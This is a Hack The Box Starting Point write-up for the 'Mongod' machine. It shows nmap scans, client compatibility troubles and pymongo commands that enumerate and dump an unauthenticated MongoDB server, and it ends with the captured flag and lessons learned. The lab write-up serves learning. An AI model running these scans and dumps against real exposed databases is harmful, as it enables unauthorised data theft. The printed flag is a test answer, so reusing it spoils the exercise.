# HTB - Starting Point - Mongod

🇧🇷 [Versão em Português](./README-mongod.pt-BR.md)

| Info         | Detail        |
|--------------|---------------|
| Platform     | Hack The Box  |
| Track        | Starting Point|
| Difficulty   | Very Easy     |
| OS           | Linux         |
| Status       | ✅ Completed  |

## Table of Contents
- [HTB - Starting Point - Mongod](#htb---starting-point---mongod)
  - [Table of Contents](#table-of-contents)
  - [Recon](#recon)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lessons Learned](#lessons-learned)

---

## Recon

I started the target machine through the HTB platform, which provided the target's IP address:

**Target IP:** `10.129.228.30`

I then connected to the Pwnbox (HTB's attack machine) and, through it, connected to the target's network via VPN.

I ran an **Nmap** scan with service/version detection to identify open ports and services on the target:

```bash
nmap -sV 10.129.228.30
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```

Only SSH appeared in the default top-1000 scan. Since that alone offered no clear entry point, I ran a full port scan across all 65535 ports:

```bash
nmap -p- 10.129.228.30
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod
```

A second port, **27017**, was open outside the common range — the default port for **MongoDB**. I confirmed the version with another scan:

```bash
nmap -p- -sV 10.129.228.30
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
```

The target was running **MongoDB 3.6.8**, an older version.

---

## Enumeration

I attempted to connect using the legacy `mongo` shell, but it wasn't installed:

```bash
mongo -h
```

```
bash: mongo: command not found
```

I tried the newer `mongosh` client instead, but it also wasn't available, so I installed it via apt:

```bash
sudo apt update && sudo apt install -y mongodb-mongosh
```

After installing, I connected to the target, specifying the host and port:

```bash
mongosh --host 10.129.228.30 --port 27017
```

```
MongoServerSelectionError: Server at 10.129.228.30:27017 reports maximum wire version 6, but this version of the Node.js Driver requires at least 8 (MongoDB 4.2)
```

`mongosh` requires MongoDB 4.2+ to connect, but the target was running the much older 3.6.8 — making this client incompatible.

I tried installing various legacy client packages (`mongodb-clients`, `mongodb-org-shell`, `mongodb-org-tools`), but none of them actually provided the old `mongo` binary on this system; modern MongoDB package repositories have dropped it in favor of `mongosh`.

I also tried downloading the legacy shell standalone from MongoDB's archive, but the extraction produced a differently named folder than expected, so that approach needed extra steps I didn't pursue further.

---

## Exploitation

Since no compatible shell was readily available, I used **Python with `pymongo`**, which handles older wire protocol versions without issue:

```bash
pip3 install pymongo --break-system-packages
```

I listed all the databases on the server:

```bash
python3 -c "
from pymongo import MongoClient
client = MongoClient('10.129.228.30', 27017, serverSelectionTimeoutMS=5000)
print(client.list_database_names())
"
```

```
['admin', 'config', 'local', 'sensitive_information', 'users']
```

Two non-default databases stood out: `sensitive_information` and `users`. I listed the collections inside each:

```bash
python3 -c "
from pymongo import MongoClient
client = MongoClient('10.129.228.30', 27017, serverSelectionTimeoutMS=5000)

db = client['sensitive_information']
print('Collections in sensitive_information:', db.list_collection_names())

db2 = client['users']
print('Collections in users:', db2.list_collection_names())
"
```

```
Collections in sensitive_information: ['flag']
Collections in users: ['ecommerceWebapp']
```

The `sensitive_information` database contained a collection literally named `flag`. I dumped its documents:

```bash
python3 -c "
from pymongo import MongoClient
client = MongoClient('10.129.228.30', 27017, serverSelectionTimeoutMS=5000)

db = client['sensitive_information']
for doc in db['flag'].find():
    print(doc)
"
```

```
{'_id': ObjectId('630e3dbcb82540ebbd1748c5'), 'flag': '1b6e6fb359e7c40241b6d431427ba6ea'}
```

> **Note:** If a compatible shell client is available, the equivalent commands inside an interactive session would be:
> ```
> show dbs
> use sensitive_information
> show collections
> db.flag.find()
> ```

---

## Flag

```
1b6e6fb359e7c40241b6d431427ba6ea
```

---

## Lessons Learned

- MongoDB, when exposed without authentication, allows anyone who can reach port 27017 to list databases, collections, and documents freely — a critical misconfiguration.
- Modern MongoDB shell clients (`mongosh`) require MongoDB 4.2+ and will refuse to connect to older servers (wire version mismatch) — when targeting legacy MongoDB versions, a compatible client (legacy `mongo` shell or a driver library like `pymongo`) is required.
- `pymongo` is a flexible fallback when the native shell isn't available or compatible — it can connect, enumerate databases/collections, and query documents directly from Python.
- Always run a full port scan (`-p-`) when a default scan returns limited results — services on non-standard ports (like MongoDB on 27017) are easy to miss otherwise.
- Database and collection names can be strong indicators of valuable data — names like `sensitive_information` or `flag` are obvious red flags worth investigating first.
